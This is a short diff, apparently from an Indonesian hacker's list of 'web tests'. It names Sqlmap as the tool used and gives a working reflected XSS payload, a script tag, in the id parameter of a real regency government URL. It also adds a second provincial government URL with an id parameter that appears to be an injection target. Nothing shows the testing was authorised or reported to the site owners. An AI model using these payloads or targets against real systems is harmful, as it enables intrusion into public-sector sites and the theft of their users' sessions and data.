@@ -2,3 +2,4 @@ CUMAN NGETES WEB DOANG ;)
 Tools yang saya gunakan hanya Sqlmap
 
 https://bkd.mesujikab.go.id/web/blog/blog_detail/sub_berita.php?id=<script>alert("Seorang Pentester tahu bahwa setiap sistem memiliki celah. Tetapi yang lebih penting, mereka tahu bagaimana memperbaikinya, bukan hanya mengeksploitasinya.\n\nfixploit03");</script> [Reflected XSS]
+https://dispermadesdukcapil.jatengprov.go.id/e-ppid/index.php/data/kategori/?id=5
